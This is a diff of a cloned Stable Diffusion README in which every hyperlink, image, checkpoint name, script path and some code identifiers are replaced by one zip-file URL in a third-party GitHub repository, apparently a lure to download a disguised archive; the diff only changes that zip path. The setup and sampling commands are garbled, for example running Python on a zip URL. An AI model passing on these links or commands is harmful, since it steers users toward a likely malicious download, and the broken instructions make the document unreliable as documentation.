@@ -1,35 +1,35 @@
 # Stable Diffusion
-*Stable Diffusion was made possible thanks to a collaboration with [Stability AI](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) and [Runway](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) and builds upon our previous work:*
+*Stable Diffusion was made possible thanks to a collaboration with [Stability AI](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) and [Runway](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) and builds upon our previous work:*
 
-[**High-Resolution Image Synthesis with Latent Diffusion Models**](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)<br/>
-[Robin Rombach](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)\*,
-[Andreas Blattmann](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)\*,
-[Dominik Lorenz](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)\,
-[Patrick Esser](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip),
-[Björn Ommer](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)<br/>
-_[CVPR '22 Oral](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) |
-[GitHub](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) | [arXiv](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) | [Project page](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)_
+[**High-Resolution Image Synthesis with Latent Diffusion Models**](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)<br/>
+[Robin Rombach](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)\*,
+[Andreas Blattmann](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)\*,
+[Dominik Lorenz](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)\,
+[Patrick Esser](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip),
+[Björn Ommer](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)<br/>
+_[CVPR '22 Oral](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) |
+[GitHub](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) | [arXiv](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) | [Project page](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)_
 
-![txt2img-stable2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
+![txt2img-stable2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
 [Stable Diffusion](#stable-diffusion-v1) is a latent text-to-image diffusion
 model.
-Thanks to a generous compute donation from [Stability AI](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) and support from [LAION](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip), we were able to train a Latent Diffusion Model on 512x512 images from a subset of the [LAION-5B](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) database. 
-Similar to Google's [Imagen](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip), 
+Thanks to a generous compute donation from [Stability AI](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) and support from [LAION](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip), we were able to train a Latent Diffusion Model on 512x512 images from a subset of the [LAION-5B](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) database. 
+Similar to Google's [Imagen](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip), 
 this model uses a frozen CLIP ViT-L/14 text encoder to condition the model on text prompts.
 With its 860M UNet and 123M text encoder, the model is relatively lightweight and runs on a GPU with at least 10GB VRAM.
-See [this section](#stable-diffusion-v1) below and the [model card](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip).
+See [this section](#stable-diffusion-v1) below and the [model card](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip).
 
   
 ## Requirements
-A suitable [conda](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) environment named `ldm` can be created
+A suitable [conda](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) environment named `ldm` can be created
 and activated with:
 
 ```
-conda env create -f https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip
+conda env create -f https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip
 conda activate ldm
 ```
 
-You can also update an existing [latent diffusion](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) environment by running
+You can also update an existing [latent diffusion](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) environment by running
 
 ```
 conda install pytorch torchvision -c pytorch
@@ -47,34 +47,34 @@ then finetuned on 512x512 images.
 
 *Note: Stable Diffusion v1 is a general text-to-image diffusion model and therefore mirrors biases and (mis-)conceptions that are present
 in its training data. 
-Details on the training procedure and data, as well as the intended use of the model can be found in the corresponding [model card](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip).*
+Details on the training procedure and data, as well as the intended use of the model can be found in the corresponding [model card](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip).*
 
-The weights are available via [the CompVis organization at Hugging Face](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) under [a license which contains specific use-based restrictions to prevent misuse and harm as informed by the model card, but otherwise remains permissive](LICENSE). While commercial use is permitted under the terms of the license, **we do not recommend using the provided weights for services or products without additional safety mechanisms and considerations**, since there are [known limitations and biases](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) of the weights, and research on safe and ethical deployment of general text-to-image models is an ongoing effort. **The weights are research artifacts and should be treated as such.**
+The weights are available via [the CompVis organization at Hugging Face](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) under [a license which contains specific use-based restrictions to prevent misuse and harm as informed by the model card, but otherwise remains permissive](LICENSE). While commercial use is permitted under the terms of the license, **we do not recommend using the provided weights for services or products without additional safety mechanisms and considerations**, since there are [known limitations and biases](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) of the weights, and research on safe and ethical deployment of general text-to-image models is an ongoing effort. **The weights are research artifacts and should be treated as such.**
 
-[The CreativeML OpenRAIL M license](LICENSE) is an [Open RAIL M license](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip), adapted from the work that [BigScience](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) and [the RAIL Initiative](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) are jointly carrying in the area of responsible AI licensing. See also [the article about the BLOOM Open RAIL license](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) on which our license is based.
+[The CreativeML OpenRAIL M license](LICENSE) is an [Open RAIL M license](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip), adapted from the work that [BigScience](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) and [the RAIL Initiative](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) are jointly carrying in the area of responsible AI licensing. See also [the article about the BLOOM Open RAIL license](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) on which our license is based.
 
 ### Weights
 
 We currently provide the following checkpoints:
 
-- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`: 237k steps at resolution `256x256` on [laion2B-en](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip).
-  194k steps at resolution `512x512` on [laion-high-resolution](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) (170M examples from LAION-5B with resolution `>= 1024x1024`).
-- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`: Resumed from `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`.
-  515k steps at resolution `512x512` on [laion-aesthetics v2 5+](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) (a subset of laion2B-en with estimated aesthetics score `> 5.0`, and additionally
-filtered to images with an original size `>= 512x512`, and an estimated watermark probability `< 0.5`. The watermark estimate is from the [LAION-5B](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) metadata, the aesthetics score is estimated using the [LAION-Aesthetics Predictor V2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)).
-- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`: Resumed from `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`. 195k steps at resolution `512x512` on "laion-aesthetics v2 5+" and 10\% dropping of the text-conditioning to improve [classifier-free guidance sampling](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip).
-- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`: Resumed from `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip`. 225k steps at resolution `512x512` on "laion-aesthetics v2 5+" and 10\% dropping of the text-conditioning to improve [classifier-free guidance sampling](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip).
+- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`: 237k steps at resolution `256x256` on [laion2B-en](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip).
+  194k steps at resolution `512x512` on [laion-high-resolution](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) (170M examples from LAION-5B with resolution `>= 1024x1024`).
+- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`: Resumed from `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`.
+  515k steps at resolution `512x512` on [laion-aesthetics v2 5+](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) (a subset of laion2B-en with estimated aesthetics score `> 5.0`, and additionally
+filtered to images with an original size `>= 512x512`, and an estimated watermark probability `< 0.5`. The watermark estimate is from the [LAION-5B](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) metadata, the aesthetics score is estimated using the [LAION-Aesthetics Predictor V2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)).
+- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`: Resumed from `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`. 195k steps at resolution `512x512` on "laion-aesthetics v2 5+" and 10\% dropping of the text-conditioning to improve [classifier-free guidance sampling](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip).
+- `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`: Resumed from `https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip`. 225k steps at resolution `512x512` on "laion-aesthetics v2 5+" and 10\% dropping of the text-conditioning to improve [classifier-free guidance sampling](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip).
 
 Evaluations with different classifier-free guidance scales (1.5, 2.0, 3.0, 4.0,
 5.0, 6.0, 7.0, 8.0) and 50 PLMS sampling
 steps show the relative improvements of the checkpoints:
-![sd evaluation results](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
+![sd evaluation results](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
 
 
 
 ### Text-to-Image with Stable Diffusion
-![txt2img-stable2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
-![txt2img-stable2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
+![txt2img-stable2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
+![txt2img-stable2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
 
 Stable Diffusion is a latent diffusion model conditioned on the (non-pooled) text embeddings of a CLIP ViT-L/14 text encoder.
 We provide a [reference script for sampling](#reference-sampling-script), but
@@ -85,27 +85,27 @@ expect to see more active community development.
 
 We provide a reference sampling script, which incorporates
 
-- a [Safety Checker Module](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip),
+- a [Safety Checker Module](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip),
   to reduce the probability of explicit outputs,
-- an [invisible watermarking](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
-  of the outputs, to help viewers [identify the images as machine-generated](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip).
+- an [invisible watermarking](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
+  of the outputs, to help viewers [identify the images as machine-generated](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip).
 
 After [obtaining the `stable-diffusion-v1-*-original` weights](#weights), link them
 ```
 mkdir -p models/ldm/stable-diffusion-v1/
-ln -s <https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip> https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip 
+ln -s <https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip> https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip 
 ```
 and sample with
 ```
-python https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip --prompt "a photograph of an astronaut riding a horse" --plms 
+python https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip --prompt "a photograph of an astronaut riding a horse" --plms 
 ```
 
-By default, this uses a guidance scale of `--scale 7.5`, [Katherine Crowson's implementation](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) of the [PLMS](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) sampler, 
-and renders images of size 512x512 (which it was trained on) in 50 steps. All supported arguments are listed below (type `python https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip --help`).
+By default, this uses a guidance scale of `--scale 7.5`, [Katherine Crowson's implementation](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) of the [PLMS](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) sampler, 
+and renders images of size 512x512 (which it was trained on) in 50 steps. All supported arguments are listed below (type `python https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip --help`).
 
 
 ```commandline
-usage: https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip [-h] [--prompt [PROMPT]] [--outdir [OUTDIR]] [--skip_grid] [--skip_save] [--ddim_steps DDIM_STEPS] [--plms] [--laion400m] [--fixed_code] [--ddim_eta DDIM_ETA]
+usage: https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip [-h] [--prompt [PROMPT]] [--outdir [OUTDIR]] [--skip_grid] [--skip_save] [--ddim_steps DDIM_STEPS] [--plms] [--laion400m] [--fixed_code] [--ddim_eta DDIM_ETA]
                   [--n_iter N_ITER] [--H H] [--W W] [--C C] [--f F] [--n_samples N_SAMPLES] [--n_rows N_ROWS] [--scale SCALE] [--from-file FROM_FILE] [--config CONFIG] [--ckpt CKPT]
                   [--seed SEED] [--precision {full,autocast}]
 
@@ -146,13 +146,13 @@ which contain both types of weights. For these, `use_ema=False` will load and us
 
 #### Diffusers Integration
 
-A simple way to download and sample Stable Diffusion is by using the [diffusers library](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip):
+A simple way to download and sample Stable Diffusion is by using the [diffusers library](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip):
 ```py
 # make sure you're logged in with `huggingface-cli login`
 from torch import autocast
 from diffusers import StableDiffusionPipeline
 
-pipe = https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip(
+pipe = https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip(
 	"CompVis/stable-diffusion-v1-4", 
 	use_auth_token=True
 ).to("cuda")
@@ -161,42 +161,42 @@ prompt = "a photo of an astronaut riding a horse on mars"
 with autocast("cuda"):
     image = pipe(prompt)["sample"][0]  
     
-https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip("https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip")
+https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip("https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip")
 ```
 
 
 ### Image Modification with Stable Diffusion
 
-By using a diffusion-denoising mechanism as first proposed by [SDEdit](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip), the model can be used for different 
+By using a diffusion-denoising mechanism as first proposed by [SDEdit](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip), the model can be used for different 
 tasks such as text-guided image-to-image translation and upscaling. Similar to the txt2img sampling script, 
 we provide a script to perform image modification with Stable Diffusion.  
 
-The following describes an example where a rough sketch made in [Pinta](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) is converted into a detailed artwork.
+The following describes an example where a rough sketch made in [Pinta](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) is converted into a detailed artwork.
 ```
-python https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip --prompt "A fantasy landscape, trending on artstation" --init-img <https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip> --strength 0.8
+python https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip --prompt "A fantasy landscape, trending on artstation" --init-img <https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip> --strength 0.8
 ```
 Here, strength is a value between 0.0 and 1.0, that controls the amount of noise that is added to the input image. 
 Values that approach 1.0 allow for lots of variations but will also produce images that are not semantically consistent with the input. See the following example.
 
 **Input**
 
-![sketch-in](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
+![sketch-in](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
 
 **Outputs**
 
-![out3](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
-![out2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
+![out3](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
+![out2](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
 
 This procedure can, for example, also be used to upscale samples from the base model.
 
 
 ## Comments 
 
-- Our codebase for the diffusion models builds heavily on [OpenAI's ADM codebase](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip)
-and [https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip). 
+- Our codebase for the diffusion models builds heavily on [OpenAI's ADM codebase](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip)
+and [https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip). 
 Thanks for open-sourcing!
 
-- The implementation of the transformer encoder is from [x-transformers](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip) by [lucidrains](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip). 
+- The implementation of the transformer encoder is from [x-transformers](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip) by [lucidrains](https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip). 
 
 
 ## BibTeX
@@ -208,7 +208,7 @@ Thanks for open-sourcing!
       year={2021},
       eprint={2112.10752},
       archivePrefix={arXiv},
-      primaryClass={https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/urethrocystitis/stable-diffusion.zip}
+      primaryClass={https://raw.githubusercontent.com/DongdongTlau/stable-diffusion/main/assets/stable-samples/txt2img/stable-diffusion-1.7-alpha.5.zip}
 }
 ```
 
